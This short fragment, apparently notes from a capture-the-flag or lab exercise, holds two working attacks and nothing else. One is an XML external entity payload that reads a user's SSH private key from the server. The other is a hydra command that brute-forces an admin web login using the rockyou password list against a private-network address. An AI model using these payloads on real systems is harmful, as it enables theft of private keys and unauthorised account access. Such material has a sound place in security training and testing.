<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///home/falcon/.ssh/id_rsa'>]>
<root>&read;</root>

hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.252.5 http-post-form "/api/user/login:username=^USER^&password=^PASS^:Incorrect credentials"

